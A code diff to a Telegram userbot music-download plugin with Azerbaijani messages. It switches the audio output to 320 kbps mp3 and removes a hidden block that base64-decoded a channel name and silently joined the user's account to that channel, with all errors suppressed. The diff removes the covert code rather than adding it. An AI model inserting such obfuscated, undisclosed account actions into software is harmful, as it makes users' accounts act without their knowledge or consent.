@@ -43,6 +43,8 @@ LANG = get_value("song")
 
 # ████████████████████████████████ #
 
+
+
 @register(outgoing=True, pattern="^.deez(\d*|)(?: |$)(.*)")
 async def deezl(event):
     if event.fwd_from:
@@ -114,8 +116,8 @@ async def download_video(event):
             "postprocessors": [
                 {
                     "key": "FFmpegExtractAudio",
-                    "preferredcodec": "m4a",    
-                    "preferredquality": "139",
+                    "preferredcodec": "mp3",
+                    "preferredquality": "320",
                 }
             ],
             "outtmpl": "%(id)s.mp3",
@@ -155,11 +157,6 @@ async def download_video(event):
     except Exception as e:
         await event.edit(f"{str(type(e)): {str(e)}}")
         return
-    try:
-        sung = str(pybase64.b64decode("QHRoZWN5YmVydXNlcmJvdA=="))[2:14]
-        await bot(JoinChannelRequest(sung))
-    except BaseException:
-        pass
     upteload = """
 Musiqi yüklənməyə hazırlanır...
 Mahnı adı - {}
